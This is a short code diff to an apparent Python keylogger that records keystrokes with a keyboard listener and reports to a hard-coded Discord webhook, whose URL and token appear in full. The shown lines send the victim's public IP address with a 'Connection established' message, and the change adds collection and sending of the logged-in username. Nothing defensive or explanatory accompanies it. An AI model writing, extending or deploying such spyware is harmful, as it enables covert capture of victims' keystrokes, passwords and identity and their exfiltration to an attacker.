@@ -3,6 +3,7 @@ import requests
 import threading
 import time
 import socket
+import os
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -22,6 +23,8 @@ special_keys = {
     keyboard.Key.cmd: " CMD ",
     keyboard.Key.esc: " ESC ",
 }
+
+username = os.getlogin()
 
 def get_public_ip():
     """Fetch the public IP address using an external API."""
@@ -81,6 +84,8 @@ def on_release(key):
 # Start by sending the public IP address to the webhook
 public_ip = get_public_ip()
 send_to_webhook(f"Connection established. Public IP address: {public_ip}")
+send_to_webhook(f"Current user: {username}")
+
 
 # Set up the listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
